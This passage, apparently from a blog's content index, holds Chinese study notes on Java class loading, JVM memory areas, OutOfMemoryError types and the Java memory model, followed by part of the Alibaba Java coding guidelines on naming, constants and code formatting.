BasicThread\n```\n\n\n\n![类加载的三个过程](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E4%B8%89%E4%B8%AA%E8%BF%87%E7%A8%8B.png)  \n\n- 加载（Loading）: 查找并且加载类的二进制数据\n\n- 链接（Linking）\n\n  1. 验证：确保被加载类的准确性\n  2. 准备：为类的静态变量分配内存，**并将其初始化为默认值**\n  3. 解析：把类中的符号引用转换为直接引用\n\n- 初始化（Initialize）：为类的静态变量赋予正确的初始值\n\n  \n\n#### Java程序对类的使用方式：主动使用和被动使用\n\n 除了下述六个外，其余的都是被动使用，不会导致类的初始化。\n\n1. new 直接使用\n\n2. 初始化一个子类，其父类也会被初始化\n\n3. 访问某个类或者接口的静态变量，或者对该静态变量进行赋值\n   - 对类的静态变量进行读写\n   - 对接口的静态变量进行读取（默认 final static）\n\n4. 调用静态方法\n\n5. 反射某个类\n\n6. 启动类。比如 java HelloWorld\n\n\n\n特例说明几个非主动引用：\n\n1. 通过子类访问父类的static变量，不会导致子类的初始化（主动引用的是父类）\n\n   ```java\n   System.out.println(Child.salary);\n   ```\n\n2. 定义引用数组，不会初始化类\n\n   ```java\n   Obj[] arrays = new Obj[10];\n   ```\n\n3. `final`修饰的==**常量**==会在编译期间放到常量池中，不会初始化类\n\n4. `final`修饰的==**复杂类型**==，在编译期间无法计算得出，会初始化类\n\n   ```java\n   import java.util.Random;\n   \n   public class ClassActiveUse {\n       static {\n           System.out.println(\"ClassActiveUse\");\n       }\n   \n       public static void main(String[] args) throws ClassNotFoundException {\n           // final修饰的常量会在编译期间放到常量池中，不会初始化类\n           System.out.println(Obj.salary);\n           System.out.println(\"--------------------------------------\");\n           // final修饰的复杂类型，在编译期间无法计算得出，会初始化类\n           System.out.println(Obj.x);\n       }\n   }\n   \n   class Obj {\n   \n       public static final long salary = 100000L;\n   \n       public static final int x = new Random().nextInt(100);\n   \n       static {\n           System.out.println(\"Obj 被初始化.\");\n       }\n   }\n   ```\n\n   输出\n\n   ```java\n   ClassActiveUse\n   100000\n   --------------------------------------\n   Obj 被初始化.\n   27\n   ```\n\n#### 加载（Loading）\n\n##### 加载的定义\n\n将class文件中的二进制数据读取到内存中，将其放在方法区中，然后在堆中创建一个java.lang.Class对象，用来封装方法区的数据结构。\n\n#####  加载类的方式\n\n- 本地磁盘中直接加载\n\n- 内存中直接加载\n\n- 通过网络加载class\n\n- 从zip、jar等归档文件中加载.class文件\n\n- 数据库中提取.class文件\n\n- 动态编译\n\n  \n\n### Class和Object对象在内存中\n\n![image-20220222143225196](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222143225196.png) \n\n##### 创建一个对象的过程\n\n![image-20220211165432806](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211165432806.png) \n\n或者\n\n![image-20220211165501885](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211165501885.png) \n\n#### 链接（Linking）\n\n#### 初始化（Initialize）\n\n- 类加载过程中的最后一步\n- 初始化阶段是执行构造函数`<cinit>`方法的过程\n\n- `<cinit>`方法是由编译器自动收集类中的所有变量的赋值动作和静态语句块中的语句合并产生的\n- 静态语句块中只能访问到定义在静态语句块之前的变量，定义在他之后的变量，只能赋值，不能访问。\n- `<cinit>`方法与类的构造函数的区别：他不需要显式的调用父类的构造函数，虚拟机会保证在子类的`<cinit>`执行之前，先执行父类的`<cinit>`，因此，在虚拟机中首先被执行的是Object的`<cinit>`方法\n- 由于父类的`<cinit>`方法先被执行，也就意味着父类中定义的静态语句块，要优于子类\n- `<cinit>`方法对于一个类来说并不是必须的\n- 接口中照样存在`<cinit>`方法\n- 虚拟机有义务保证`<cinit>`方法的线程安全\n\n### JVM类加载器\n\n#### 父委托机制\n\n1. 类加载器的委托是优先交给父亲加载器先去尝试加载\n2. 父加载器和子加载器其实是一种包装关系，或者包含关系\n\n![image-20220211172948276](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211172948276.png) \n\n\n\n```java\npublic class BootClassLoader {\n\n    public static void main(String[] args) throws ClassNotFoundException {\n        // 根（Bootstrap）类加载器加载的内容\n        System.out.println(System.getProperty(\"sun.boot.class.path\"));\n        System.out.println(\"------------------\");\n        // 扩展（Extension）类加载器加载的内容\n        System.out.println(System.getProperty(\"java.ext.dirs\"));\n        System.out.println(\"------------------\");\n\n        Class<?> klass = Class.forName(\"example.chapter2.SimpleObject\");\n        // 系统(Application)类加载器\n        // sun.misc.Launcher$AppClassLoader@18b4aac2\n        System.out.println(klass.getClassLoader());\n        // 扩展类加载器\n        // sun.misc.Launcher$ExtClassLoader@6d6f6e28\n        System.out.println(klass.getClassLoader().getParent());\n        // 根加载器是由C++写的，输出为null。\n        System.out.println(klass.getClassLoader().getParent().getParent());\n\n        // 无法获取到自定义的String类\n        // 原因：父加载器中存在，优先返回父加载器\n        Class<?> clazz = Class.forName(\"java.lang.String\");\n        System.out.println(clazz);\n        System.out.println(clazz.getClassLoader());\n    }\n}\n```\n\n#### 类加载器的命名空间\n\n- 每个类的加载器都有子命名空间。命名空间由该加载器和其所有父加载器的类组成\n\n- 在同一个命名空间中，不会出现完整的名字\n\n  ![image-20220212115459354](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220212115459354.png) \n\n#### 运行时包\n\n- 父类加载器看不到子类加载器加载的类\n\n- 不同命名空间下的类加载器之间的类互相不可访问\n\n  ```java\n  可以理解为：运行时，类的实际包名 = 类加载器名称 + 包名\n  \n  //Boot.Ext.App.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest\n  //Boot.Ext.App.SimpleClassLoader.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest\n  ```\n\n### 类的卸载以及ClassLoader的卸载（GC）\n\nJVM中的Class只有满足以下三个条件，才能被GC回收，也就是该Class被卸载（unload）\n\n- 该类所有的实例都已经被GC\n- 加载该类的ClassLoader实例被GC\n- 该类的java.lang.Class对象没有在任何地方被引用\n\nGC的时机我们是不可控的，那么同样的我们对于Class的卸载也是不可控的\n\n### 线程上下文类加载器\n\n举例\n\n```java\nClass.forName(\"com.mysql.jdbc.Driver\")\n```\n\n\n\n\n\n## JVM内存结构\n\n<img src=\"https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-abefb713de46f1e6dd241246c0afe263_720w.jpg\" alt=\"img\"/>    \n\nJVM的内存结构大概分为：\n\n- 堆（Heap）：线程共享。所有的==对象实例==以及==数组==都要在堆上分配。**回收器主要管理的对象**。\n- 方法区（Method Area）：线程共享。存储类信息、常量、静态变量、即时编译器编译后的代码。（非堆）\n- 虚拟机栈（JVM Stack）：线程私有。存储局部变量表、操作栈、动态链接、方法出口，对象指针。\n- 本地方法栈（Native Method Stack）：线程私有。为虚拟机使用到的Native 方法服务。如Java使用c或者c++编写的接口服务时，代码在此区运行。\n- 程序计数器（Program Counter Register）：线程私有。有些文章也翻译成PC寄存器（PC Register）。可看作是当前线程所执行的字节码的行号指示器。指向下一条要执行的指令。\n\n先看一张图，这张图能很清晰的说明JVM内存结构的布局和相应的控制参数：\n\n<img src=\"https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-8845236d1ab9f22fcc658375967d53fb_720w.jpg\" alt=\"img\" style=\"zoom:150%;\" /> \n\n### 堆\n\n堆的作用是存放对象实例和数组。从结构上来分，可以分为新生代和老年代。而新生代又可以分为Eden 空间、From Survivor 空间（s0）、To Survivor 空间（s1）。\n\n所有新生成的对象首先都是放在新生代的。\n\n需要注意，Survivor的两个区是对称的，没先后关系，所以同一个区中可能同时存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年代的只有从第一个Survivor区过来的对象。而且，Survivor区总有一个是空的。\n\n- 控制参数\n\n-Xms设置堆的最小空间大小。-Xmx设置堆的最大空间大小。\n\n-XX:NewSize设置新生代最小空间大小。-XX:MaxNewSize设置新生代最大空间大小。\n\n\n\n- 垃圾回收\n\n此区域是垃圾回收的主要操作区域。\n\n\n\n- 异常情况\n\n如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError 异常\n\n### 方法区\n\n方法区（Method Area）与Java 堆一样，**是各个线程共享的内存区域**，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。\n\n虽然Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做`Non-Heap（非堆）`，目的应该是与Java 堆区分开来。\n\n\n\n很多人愿意把方法区称为“永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为HotSpot虚拟机的设计团队选择把GC 分代收集扩展至方法区，或者说使用永久代来实现方法区而已。对于其他虚拟机（如BEA JRockit、IBM J9 等）来说是不存在永久代的概念的。在Java8中永生代彻底消失了。\n\n\n\n- 控制参数\n\n-XX:PermSize 设置最小空间 -XX:MaxPermSize 设置最大空间。\n\n\n\n- 垃圾回收\n\n对此区域会涉及但是很少进行垃圾回收。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收“成绩”比较难以令人满意。\n\n\n\n- 异常情况\n\n根据Java 虚拟机规范的规定， 当方法区无法满足内存分配需求时，将抛出OutOfMemoryError。\n\n### 方法栈（虚拟机栈）\n\n每个线程会有一个私有的栈。每个线程中方法的调用又会在本栈中创建一个**栈帧**。在方法栈中会存放编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不等同于对象本身。**局部变量表所需的内存空间在编译期间完成分配**，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。\n\n\n\n- 控制参数\n\n-Xss控制每个线程栈的大小。\n\n\n\n- 异常情况\n\n在Java 虚拟机规范中，对这个区域规定了两种异常状况：\n\n\\- StackOverflowError： 异常线程请求的栈深度大于虚拟机所允许的深度时抛出；\n\n\\- OutOfMemoryError 异常： 虚拟机栈可以动态扩展，当扩展时无法申请到足够的内存时会抛出。\n\n### 本地方法栈\n\n本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java 方法（也就是字节码）服务，而本地方法栈则\n\n是为虚拟机使用到的Native 方法服务。\n\n- 控制参数\n\n在Sun JDK中本地方法栈和方法栈是同一个，因此也可以用-Xss控制每个线程的大小。\n\n- 异常情况\n\n与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError 和OutOfMemoryError异常。\n\n\n\n### 程序计数器\n\n它的作用可以看做是当前线程所执行的字节码的行号指示器。\n\n- 异常情况：\n\n  此内存区域是唯一一个在Java 虚拟机规范中没有规定任何OutOfMemoryError 情况的区域。\n\n\n\n----\n\n\n\n##  常见内存溢出错误说明\n\n有了对内存结构清晰的认识，就可以帮助我们理解不同的OutOfMemoryErrors，下面列举一些比较常见的内存溢出错误，通过查看冒号“：”后面的提示信息，基本上就能断定是JVM运行时数据的哪个区域出现了问题。\n\n```text\nException in thread “main”: java.lang.OutOfMemoryError: Java heap space\n\n原因：对象不能被分配到堆内存中。\n```\n\n\n\n```text\nException in thread “main”: java.lang.OutOfMemoryError: PermGen space\n\n原因：类或者方法不能被加载到老年代。它可能出现在一个程序加载很多类的时候，比如引用了很多第三方的库。\n```\n\n\n\n```text\nException in thread “main”: java.lang.OutOfMemoryError: Requested array size exceeds VM limit\n\n原因：创建的数组大于堆内存的空间。\n```\n\n\n\n```text\nException in thread “main”: java.lang.OutOfMemoryError: request <size> bytes for <reason>. Out of swap space?\n\n原因：方法内存分配失败。JNI、本地库或者Java虚拟机都会从本地堆中分配内存空间。\n```\n\n\n\n```text\nException in thread “main”: java.lang.OutOfMemoryError: <reason> <stack trace>（Native method）\n\n原因：同样是本地方法内存分配失败，只不过是JNI或者本地方法或者Java虚拟机发现。\n```\n\n\n\n关于OutOfMemoryError的更多信息可以查看：\n\n[Troubleshooting Memory Leaksdocs.oracle.com/javase/7/docs/webnotes/tsg/TSG-VM/html/memleaks.html](https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/7/docs/webnotes/tsg/TSG-VM/html/memleaks.html)\n\n\n\n## **Java内存模型**\n\n\n\n​\t\t由上述对JVM内存结构的描述中，我们知道了堆和方法区是线程共享的。而局部变量，方法定义参数和异常处理器参数就不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响。\n\n\n\n**Java线程之间的通信由Java内存模型（本文简称为JMM）控制**\n\n​\t\tJMM决定一个线程对共享变量的写入何时对另一个线程可见。\n\n​\t\t从抽象的角度来看，JMM定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），`本地内存中存储了该线程以读/写共享变量的副本`。\n\n​\t\t本地内存是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。\n\n​\t\tJava内存模型的抽象示意图如下：\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-b098a84eb7598d70913444a991d1759b_720w.jpg) \n\n从上图来看，线程A与线程B之间如要通信的话，必须要经历下面2个步骤：\n\n1. 首先，线程A把本地内存A中更新过的共享变量刷新到主内存中去。\n2. 通知本地内存共享变量的副本失效，再次读取时需要强制从主内存读取。\n3. 然后，线程B到主内存中去读取线程A之前已更新过的共享变量。\n\n下面通过示意图来说明这两个步骤：\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-2c452d147bf0d09b14b770d3990740cb_720w.jpg) \n\n如上图所示，本地内存A和B有主内存中共享变量x的副本。假设初始时，这三个内存中的x值都为0。线程A在执行时，把更新后的x值（假设值为1）临时存放在自己的本地内存A中。当线程A和线程B需要通信时，线程A首先会把自己本地内存中修改后的x值刷新到主内存中，此时主内存中的x值变为了1。随后，线程B到主内存中去读取线程A更新后的x值，此时线程B的本地内存的x值也变为了1。\n\n\n\n从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且**这个通信过程必须要经过主内存**。JMM通过控制主内存与每个线程的本地内存之间的交互，来为java程序员提供内存可见性保证。\n\n## 指令重排序\n\n在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。\n\n这里说的重排序可以发生在好几个地方：编译器、运行时、JIT等，比如编译器会觉得把一个变量的写操作放在最后会更有效率，编译后，这个指令就在最后了（前提是只要不改变程序的语义，编译器、执行器就可以这样自由的随意优化），一旦编译器对某个变量的写操作进行优化（放到最后），那么在执行之前，另一个线程将不会看到这个执行结果。\n\n\n\n当然了，写入动作可能被移到后面，那也有可能被挪到了前面，这样的“优化”有什么影响呢？这种情况下，其它线程可能会在程序实现“发生”之前，看到这个写入动作（这里怎么理解，指令已经执行了，但是在代码层面还没执行到）。通过`内存屏障`的功能，我们可以禁止一些不必要、或者会带来负面影响的重排序优化，在内存模型的范围内，实现更高的性能，同时保证程序的正确性。\n\n\n\n下面我们来看一个重排序的例子：\n\n```java\nClass Reordering {\n  int x = 0, y = 0;\n  public void writer() {\n    x = 1;\n    y = 2;\n  }\n  public void reader() {\n    int r1 = y;\n    int r2 = x;\n  }\n}\n```\n\n假设这段代码有2个线程并发执行，线程A执行writer方法，线程B执行reader方法，线程B看到y的值为2，因为把y设置成2发生在变量x的写入之后（代码层面），所以能断定线程B这时看到的x就是1吗？\n\n当然不行！ 因为在writer方法中，可能发生了重排序，y的写入动作可能发在x写入之前，这种情况下，线程B就有可能看到x的值还是0。\n\n在Java内存模型中，描述了在多线程代码中，哪些行为是正确的、合法的，以及多线程之间如何进行通信，代码中变量的读写行为如何反应到内存、CPU缓存的底层细节。\n\n在Java中包含了几个关键字：volatile、final和synchronized，帮助程序员把代码中的并发需求描述给编译器。JMM中定义了它们的行为，确保正确同步的Java代码在所有的处理器架构上都能正确执行。\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java开发手册【阿里巴巴】","url":"/20250619/ba2334ee.html","content":"\n\n\n| 版本号 | 制定团队                       | 更新日期   | 备注                       |\n| ------ | ------------------------------ | ---------- | -------------------------- |\n| 1.7.0  | 阿里巴巴与全球 Java 社区开发者 | 2020.08.03 | 嵩山版，首次发布前后端规约 |\n|        |                                |            |                            |\n\n# 一、 编程规约\n\n## (一)  命名风格\n\n1. <font color=\" #C00000\">【强制】</font>代码中的命名均不能以下划线或美元符号开始，也不能以下划线或美元符号结束。    <font color=\" #FF4500\">反例：</font><font color=\"red\">\\_name / \\_\\_name / $name / name\\_ / name$ / name\\_\\_ </font>\n\n2. <font color=\" #C00000\">【强制】</font>所有编程相关的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。\n   <font color=\" #977C00\">说明：</font>正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，纯拼音命名方式更要避免采用。 \n\n    <font color=\"#019858\">正例：</font>ali / alibaba / taobao / cainiao/ aliyun/ youku / hangzhou  等国际通用的名称，可视同英文。 \n\n   <font color=\" #FF4500\">反例：</font>DaZhePromotion [打折] / getPingfenByName() [评分] / String fw[福娃] / int  某变量 = 3 \n\n3. <font color=\" #C00000\">【强制】</font>代码和注释中都要避免使用任何语言的种族歧视性词语。\n\n   <font color=\"#019858\">正例：</font>日本人 /  印度人 / blockList / allowList / secondary \n\n   <font color=\" #FF4500\">反例：</font>RIBENGUIZI / Asan / blackList / whiteList / slave\n\n4. <font color=\" #C00000\">【强制】</font>类名使用 UpperCamelCase 风格，但以下情形例外：DO / BO / DTO / VO / AO / PO / UID 等。 \n\n   <font color=\"#019858\">正例：</font>ForceCode  /  UserDO  /  HtmlDTO  /  XmlService  /  TcpUdpDeal  /  TaPromotion\n\n   <font color=\" #FF4500\">反例：</font>forcecode  /  UserDo  /  HTMLDto  /  XMLService  /  TCPUDPDeal  /  TAPromotion\n\n5. <font color=\" #C00000\">【强制】</font>方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格。     <font color=\"#019858\">正例：</font> localValue / getHttpMessage() / inputUserId\n\n6. <font color=\" #C00000\">【强制】</font>常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。\n\n   <font color=\"#019858\">正例：</font>MAX\\_STOCK\\_COUNT / CACHE\\_EXPIRED\\_TIME\n\n   <font color=\" #FF4500\">反例：</font>MAX\\_COUNT / EXPIRED\\_TIME\n\n7. <font color=\" #C00000\">【强制】</font>抽象类命名使用 Abstract 或 Base 开头；异常类命名使用 Exception 结尾；测试类 命名以它要测试的类的名称开始，以 Test 结尾。 \n\n8. <font color=\" #C00000\">【强制】</font>类型与中括号紧挨相连来表示数组。\n\n   <font color=\"#019858\">正例：</font>定义整形数组 int[] arrayDemo。 \n\n   <font color=\" #FF4500\">反例：</font>在 main 参数中，使用 String args[]来定义。\n\n9. <font color=\" #C00000\">【强制】</font>POJO 类中的任何布尔类型的变量，都不要加 is 前缀，否则部分框架解析会引起序列化错误。\n\n   <font color=\" #977C00\">说明：</font>在本文 MySQL 规约中的建表约定第一条，表达是与否的变量采用 is\\_xxx 的命名方式，所以，需要在<resultMap>设置从 is\\_xxx 到 xxx 的映射关系。\n\n   <font color=\" #FF4500\">反例：</font>定义为基本数据类型 Boolean isDeleted 的属性，它的方法也是 isDeleted()，框架在反向解析的时 候，“误以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。\n\n10. <font color=\" #C00000\">【强制】</font>包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用<font color=\"blue\">单数</font>形式，但是类名如果有复数含义，类名可以使用复数形式。\n\n    <font color=\"#019858\">正例：</font>应用工具类包名为 com.alibaba.ei.kunlun.aap.util、类名为 MessageUtils（此规则参考 spring 的 框架结构）\n\n11. <font color=\" #C00000\">【强制】</font>避免在子父类的成员变量之间、或者不同代码块的局部变量之间采用完全相同的命名， 使可理解性降低。 \n\n    <font color=\" #977C00\">说明：</font>子类、父类成员变量名相同，即使是 public 类型的变量也能够通过编译，另外，局部变量在同一方 法内的不同代码块中同名也是合法的，这些情况都要避免。对于非 setter/getter 的参数名称也要避免与成员变量名称相同。\n\n    <font color=\" #FF4500\">反例：</font>\n\n    ```java\n    public class ConfusingName {\n        public int stock;\n    \n        // 非setter/getter的参数名称，不允许与本类成员变量同名\n        public void get(String alibaba) {\n            if (condition) {\n                final int money = 666;\n                // ...\n            }\n            for (int i = 0; i < 10; i++) {\n                // 在同一方法体中，不允许与其它代码块中的money命名相同\n                final int money = 15978;\n                // ...\n            }\n        }\n    }\n    \n    class Son extends ConfusingName {\n        // 不允许与父类的成员变量名称相同\n        public int stock;\n    }\n    ```\n\n    \n\n12. <font color=\" #C00000\">【强制】</font>杜绝完全不规范的缩写，避免望文不知义。 \n\n    <font color=\" #FF4500\">反例：</font>AbstractClass“缩写”成 AbsClass；condition“缩写”成  condi；Function 缩写”成 Fu，此类 随意缩写严重降低了代码的可阅读性。\n\n13. <font color=\" #FFC000\">【推荐】</font>为了达到代码自解释的目标，任何自定义编程元素在命名时，使用尽量完整的单词组 合来表达。\n\n     <font color=\"#019858\">正例：</font>对某个对象引用的 volatile 字段进行原子更新的类名为 AtomicReferenceFieldUpdater。\n\n     <font color=\" #FF4500\">反例：</font>常见的方法内变量为 int a;的定义方式。\n\n14. <font color=\" #FFC000\">【推荐】</font>在常量与变量的命名时，**表示类型的名词放在词尾**，以提升辨识度。\n\n     <font color=\"#019858\">正例：</font>startTime / workQueue / nameList / TERMINATED\\_THREAD\\_COUNT\n\n     <font color=\" #FF4500\">反例：</font>startedAt / QueueOfWork / listName / COUNT\\_TERMINATED\\_THREAD\n\n15. <font color=\" #FFC000\">【推荐】</font>如果模块、接口、类、方法使用了设计模式，在命名时需体现出具体模式。\n\n    <font color=\" #977C00\">说明：</font>将设计模式体现在名字中，有利于阅读者快速理解架构设计理念。     \n\n    <font color=\"#019858\">正例：</font>  \n\n    ```java\n    public class OrderFactory;\n    public class LoginProxy;\n    public class ResourceObserver;\n    ```\n\n    \n\n16. <font color=\" #FFC000\">【推荐】</font>接口类中的方法和属性不要加任何修饰符号（public  也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，确定与接口方法相关，并且是整个应用的基础常量。\n\n    <font color=\"#019858\">正例：</font>\n\n        接口方法签名  void commit(); \n        接口基础常量  String COMPANY = \"alibaba\";\n\n    <font color=\" #FF4500\">反例：</font>接口方法定义  `public abstract void f(); `\n\n    <font color=\" #977C00\">说明：</font>JDK8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。\n\n17. 接口和实现类的命名有两套规则：\n\n    - <font color=\" #C00000\">【强制】</font>对于 Service 和 DAO 类，基于 SOA 的理念，暴露出来的服务一定是接口，内部的实现类用 Impl 的后缀与接口区别。\n\n      <font color=\"#019858\">正例：</font>CacheServiceImpl 实现 CacheService 接口。 \n\n    - <font color=\" #FFC000\">【推荐】</font>如果是形容能力的接口名称，取对应的形容词为接口名（通常是–able 的形容词）。\n      <font color=\"#019858\">正例：</font>AbstractTranslator 实现  Translatable 接口。 \n\n18. <font color=\"#76923C\">【参考】</font>枚举类名带上 Enum 后缀，枚举成员名称需要全大写，单词间用下划线隔开。\n\n    <font color=\" #977C00\">说明：</font>枚举其实就是特殊的常量类，且构造方法被默认强制是私有。    \n\n    <font color=\"#019858\">正例：</font>枚举名字为 ProcessStatusEnum 的成员名称：SUCCESS / UNKNOWN\\_REASON。 \n\n19. <font color=\"#76923C\">【参考】</font>各层命名规约\n\n     - Service/DAO 层方法命名规约\n\n       1）  获取单个对象的方法用 get 做前缀。 \n\n       2）  获取多个对象的方法用 list 做前缀，复数结尾，如：listObjects。    \n\n       3）  获取统计值的方法用 count 做前缀。 \n\n       4）  插入的方法用 save/insert 做前缀。 \n\n       5）  删除的方法用 remove/delete 做前缀。 \n\n       6）  修改的方法用 update 做前缀。 \n\n     - 领域模型命名规约\n\n       1）  数据对象：xxxDO，xxx 即为数据表名。\n\n       2）  数据传输对象：xxxDTO，xxx 为业务领域相关的名称。\n\n       3）  展示对象：xxxVO，xxx 一般为网页名称。\n\n       4）  POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。\n\n## (二)  常量定义 \n\n1. <font color=\" #C00000\">【强制】</font>不允许任何魔法值（即未经预先定义的常量）直接出现在代码中。\n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   //  本例中，开发者 A 定义了缓存的 key，然后开发者 B 使用缓存时少了下划线，即 key 是\"Id#taobao\"+tradeId，导致 出现故障 \n   String key = \"Id#taobao\\_\" + tradeId; \n   cache.put(key, value); \n   ```\n\n\n2. <font color=\" #C00000\">【强制】</font>在 long 或者 Long 赋值时，数值后使用大写字母 L，不能是小写字母 l，小写容易跟 数字混淆，造成误解。\n\n   <font color=\" #977C00\">说明：</font>Long a = 2l;  写的是数字的 21，还是 Long 型的 2？\n\n3. <font color=\" #FFC000\">【推荐】</font>不要使用一个常量类维护所有常量，要按常量功能进行归类，分开维护。\n\n   <font color=\" #977C00\">说明：</font>大而全的常量类，杂乱无章，使用查找功能才能定位到修改的常量，不利于理解，也不利于维护。     \n\n   <font color=\"#019858\">正例：</font>缓存相关常量放在类 CacheConsts 下；系统配置相关常量放在类 SystemConfigConsts 下。 \n\n4. <font color=\" #FFC000\">【推荐】</font>常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量、类内共享常量。\n\n   1）  跨应用共享常量：放置在二方库中，通常是 client.jar 中的 constant 目录下。 \n\n   2）  应用内共享常量：放置在一方库中，通常是子模块中的 constant 目录下。 \n\n      <font color=\" #FF4500\">反例：</font>易懂变量也要统一定义成应用内共享常量，两位工程师在两个类中分别定义了“YES”的变量：\n\n   ```java\n   类 A 中：public static final String YES = \"yes\";\n   类 B 中：public static final String YES = \"y\";\n   A.YES.equals(B.YES)，预期是 true，但实际返回为 false，导致线上问题。\n   ```\n\n   3）  子工程内部共享常量：即在当前子工程的 constant 目录下。 \n\n   4）  包内共享常量：即在当前包下单独的 constant 目录下。 \n\n   5）  类内共享常量：直接在类内部 private static final 定义。 \n\n5. <font color=\" #FFC000\">【推荐】</font>如果变量值仅在一个固定范围内变化用 enum 类型来定义。\n\n   <font color=\" #977C00\">说明：</font>如果存在名称之外的延伸属性应使用 enum 类型，下面正例中的数字就是延伸信息，表示一年中的 第几个季节。\n\n    <font color=\"#019858\">正例：</font>\n\n   ```java\n   public enum SeasonEnum {\n       SPRING(1), SUMMER(2), AUTUMN(3), WINTER(4);\n       private int seq;\n       SeasonEnum(int seq) {\n           this.seq = seq;\n       }\n       public int getSeq() {\n           return seq;\n       }\n   } \n   ```\n\n## (三)  代码格式 \n\n1. <font color=\" #C00000\">【强制】</font>如果是大括号内为空，则简洁地写成{}即可，大括号中间无需换行和空格；如果是非空代码块则： \n\n   1）  左大括号前不换行。\n\n   2）  左大括号后换行。\n\n   3）  右大括号前换行。\n\n   4）  右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。\n\n2. <font color=\" #C00000\">【强制】</font>左小括号和右边相邻字符之间不出现空格；右小括号和左边相邻字符之间也不出现空 格；而左大括号前需要加空格。详见第 5 条下方正例提示。\n\n   <font color=\" #FF4500\">反例：</font>if (空格 a == b 空格)  \n\n3. <font color=\" #C00000\">【强制】</font>if/for/while/switch/do 等保留字与括号之间都必须加空格。\n\n4. <font color=\" #C00000\">【强制】</font>任何二目、三目运算符的左右两边都需要加一个空格。\n\n   <font color=\" #977C00\">说明：</font>包括赋值运算符=、逻辑运算符&&、加减乘除符号等。\n\n5. <font color=\" #C00000\">【强制】</font>采用 4 个空格缩进，禁止使用 Tab 字符。 \n\n   <font color=\" #977C00\">说明：</font>如果使用Tab缩进，必须设置1个Tab为4个空格。IDEA设置Tab为4个空格时，请勿勾选Use tab character；而在Eclipse中，必须勾选insert spaces for tabs。     \n\n   <font color=\"#019858\">正例：</font> （涉及1-5 点）\n\n   ```java\n   public static void main(String[] args) {\n       // 缩进4个空格\n       String say = \"hello\";\n       // 运算符的左右必须有一个空格\n       int flag = 0;\n       // 关键词if与括号之间必须有一个空格，括号内的f与左括号，0与右括号不需要空格\n       if (flag == 0) {\n           System.out.println(say);\n       }\n       // 左大括号前加空格且不换行；左大括号后换行\n       if (flag == 1) {\n           System.out.println(\"world\");\n           // 右大括号前换行，右大括号后有else，不用换行\n       } else {\n           System.out.println(\"ok\");\n           // 在右大括号后直接结束，则必须换行\n       }\n   }\n   ```\n\n6. <font color=\" #C00000\">【强制】</font>注释的双斜线与注释内容之间有且仅有一个空格。\n\n   <font color=\"#019858\">正例：</font>  \n\n   ```java\n   //  这是示例注释，请注意在双斜线之后有一个空格 \n   String commentString = new String(); \n   ```\n\n   \n\n7. <font color=\" #C00000\">【强制】</font>在进行类型强制转换时，右括号与强制转换值之间不需要任何空格隔开。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   double first = 3.2d; \n   int second = (int)first + 2;    \n   ```\n\n8. <font color=\" #C00000\">【强制】</font>单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：\n\n   1）第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。  \n\n   2）运算符与下文一起换行。\n\n   3）方法调用的点符号与下文一起换行。\n\n   4）方法调用中的多个参数需要换行时，在逗号后进行。 \n\n   5）在括号前不要换行，见反例。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   //  超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点号一起换行 \n   sb.append(\"yang\").append(\"hao\")\n           .append(\"chen\")\n           .append(\"chen\")\n           .append(\"chen\");\n   ```\n\n   <font color=\" #FF4500\">反例：</font> \n\n   ```java\n   StringBuilder sb = new StringBuilder(); 